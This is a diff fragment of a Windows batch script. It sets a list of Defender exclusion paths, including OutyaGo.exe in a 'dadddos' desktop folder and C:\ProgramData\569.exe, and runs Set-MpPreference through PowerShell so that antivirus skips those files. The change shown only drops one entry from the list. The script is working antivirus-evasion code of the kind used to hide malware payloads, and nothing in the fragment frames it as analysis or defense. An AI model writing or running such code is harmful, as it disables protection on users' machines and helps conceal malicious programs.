@@ -37,6 +37,6 @@ set exclusionPath34=C:\Users\%USERNAME%\Desktop\dadddos\OutyaGo.exe
 set exclusionPath35=C:\Users\%USERNAME%\Desktop\OutyaGo.exe
 set exclusionPath36=C:\ProgramData\569.exe
 
-set "psCommand=Set-MpPreference -ExclusionPath @('%exclusionPath1%','%exclusionPath2%','%exclusionPath3%','%exclusionPath4%','%exclusionPath5%','%exclusionPath6%','%exclusionPath7%','%exclusionPath8%','%exclusionPath9%','%exclusionPath10%','%exclusionPath11%','%exclusionPath12%','%exclusionPath13%','%exclusionPath14%','%exclusionPath15%','%exclusionPath16%','%exclusionPath17%','%exclusionPath18%'
+set "psCommand=Set-MpPreference -ExclusionPath @('%exclusionPath1%','%exclusionPath2%','%exclusionPath3%','%exclusionPath4%','%exclusionPath5%','%exclusionPath6%','%exclusionPath7%','%exclusionPath8%','%exclusionPath9%','%exclusionPath10%','%exclusionPath11%','%exclusionPath12%','%exclusionPath13%','%exclusionPath14%','%exclusionPath15%','%exclusionPath16%','%exclusionPath17%'
 
 powershell -Command "& {%psCommand%}"
